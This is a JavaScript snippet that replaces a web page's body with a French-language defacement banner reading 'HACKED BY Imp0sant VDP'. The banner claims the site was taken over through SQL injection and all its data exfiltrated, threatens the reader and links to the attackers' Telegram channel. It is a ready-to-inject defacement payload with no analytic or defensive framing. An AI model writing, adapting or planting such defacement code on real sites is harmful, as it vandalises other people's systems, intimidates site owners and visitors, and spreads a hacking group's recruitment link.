document.body.innerHTML = `
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>SQLI BY Imp0sant</title>

<style>
    body {
        margin: 0;
        padding: 0;
        background-color: black;
        color: red;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        text-align: center;
        font-family: Arial, sans-serif;
    }

    .container {
        max-width: 900px;
        padding: 20px;
    }

    .img {
        width: 180px;
        height: 180px;
        margin-bottom: 30px;
        border-radius: 50%;
        box-shadow: 0 0 40px red;
    }

    h1 {
        color: red;
        margin-bottom: 15px;
    }

    h3 {
        margin: 10px 0;
    }

    .yellow {
        color: yellow;
    }

    .link {
        display: inline-block;
        margin-top: 30px;
        padding: 12px 30px;
        background-color: blue;
        color: white;
        font-weight: bold;
        text-decoration: none;
        border-radius: 10px;
        box-shadow: 0 0 10px blue;
    }

    .link:hover {
        box-shadow: 0 0 20px blue;
    }
</style>
</head>

<body>
    <div class="container">
        <img class="img" src="https://i.postimg.cc/q79gXyTp/image-2.webp" alt="LOGO X-VDP-X">

        <h1>HACKED BY Imp0sant VDP.</h1>

        <h3 class="yellow">VOUS AVEZ ÉTÉ VICTIME D'UNE INJECTION SQL!</h3>

        <h3>
            VOTRE SYSTÈME A ÉTÉ COMPROMIS. NOUS AVONS TOUT.  
            NOUS AVONS INFILTRÉ CHAQUE ÉTAGE DE VOTRE RÉSEAU.  
            VOS DONNÉES SONT À NOUS. TOUT A ÉTÉ EXFILTRÉ.  
            MAIS VOUS N'AVEZ AUCUNE CHANCE DE NOUS ARRÊTER.  
            NOUS SOMMES DÉJÀ LÀ.
        </h3>

        <h3>VOTRE PEUR NOUS ALIMENTE. VOTRE SYSTÈME NOUS APPARTIENT !</h3>

        <h3>FUCK BY X-VDP-X</h3>

        <a class="link" href="https://t.me/xvdpx6" target="_blank">JOIN TELEGRAM</a>
    </div>
</body>
</html>

`
